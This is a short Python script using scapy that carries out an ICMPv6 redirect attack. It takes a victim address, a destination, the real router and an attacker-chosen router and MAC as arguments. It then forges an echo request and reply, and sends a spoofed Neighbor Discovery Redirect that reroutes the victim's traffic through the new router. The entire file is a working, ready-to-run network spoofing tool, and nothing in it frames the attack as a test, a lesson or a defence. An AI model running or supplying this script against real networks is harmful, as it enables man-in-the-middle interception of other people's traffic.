#!/usr/bin/python
import sys
from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, ICMPv6EchoReply, ICMPv6ND_Redirect, ICMPv6NDOptDstLLAddr, \
    ICMPv6NDOptRedirectedHdr
from scapy.sendrecv import send

# Ask user to insert value
if len(sys.argv) == 6:
    victim_ip = sys.argv[1]
    dst_ip = sys.argv[2]
    original_router = sys.argv[3]
    new_router = sys.argv[4]
    mac_new_router = sys.argv[5]
else:
    print("Please insert:\n 1. Victim IPv6\n 2. Destination IPv6\n "
          "3. Original router\n 4. New router\n 5. MAC of new router")
    sys.exit(1)

# Generate ICMPv6 Request
data = 16*"A"
base_1 = IPv6()
base_1.src = dst_ip
base_1.dst = victim_ip
packet1 = base_1/ICMPv6EchoRequest(data=data)

# Generate ICMPv6 Reply
base_2 = IPv6()
base_2.src = victim_ip
base_2.dst = dst_ip
packet2 = base_2/ICMPv6EchoReply(data=data)

# Generate Redirect, but we need two previous messages to succeed in attack
base_3 = IPv6()
base_3.src = original_router
base_3.dst = victim_ip

packet3 = base_3/ICMPv6ND_Redirect(tgt=new_router, dst="2001:db8:abcd:3:801c:42ff:feb5:f675")/\
         ICMPv6NDOptDstLLAddr(lladdr=mac_new_router)/\
         ICMPv6NDOptRedirectedHdr(pkt=packet2)
send(packet1, verbose=False)
send(packet2, verbose=False)
send(packet3, verbose=False)
print("Redirect message is sent to host: " + victim_ip)

